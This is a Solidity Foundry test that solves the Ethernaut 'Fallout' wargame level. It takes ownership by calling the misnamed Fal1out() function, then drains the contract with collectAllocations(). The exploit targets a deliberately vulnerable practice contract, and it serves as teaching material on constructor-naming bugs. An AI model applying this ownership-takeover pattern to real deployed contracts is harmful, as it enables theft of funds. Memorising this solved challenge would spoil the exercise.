// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "../levels/02-Fallout/FalloutFactory.sol";
import "../core/Ethernaut.sol";

contract FalloutTest is DSTest {
    //--------------------------------------------------------------------------------
    //                            Setup Game Instance
    //--------------------------------------------------------------------------------

    Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
    Ethernaut ethernaut;
    address attacker = address(0xdeadbeef);

    function setUp() public {
        ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
        vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
    }

    function testFalloutHack() public {
        //--------------------------------------------------------------------------------
        //                             Setup Level Instance
        //--------------------------------------------------------------------------------
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout falloutContract = Fallout(payable(levelAddress));

        //--------------------------------------------------------------------------------
        //                             Start Level Attack
        //--------------------------------------------------------------------------------
        falloutContract.Fal1out{value: 1 wei}();
        assertEq(falloutContract.owner(), attacker);

        falloutContract.collectAllocations();
        assertEq(address(falloutContract).balance, 0);

        //--------------------------------------------------------------------------------
        //                                Submit Level
        //--------------------------------------------------------------------------------
        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }
}
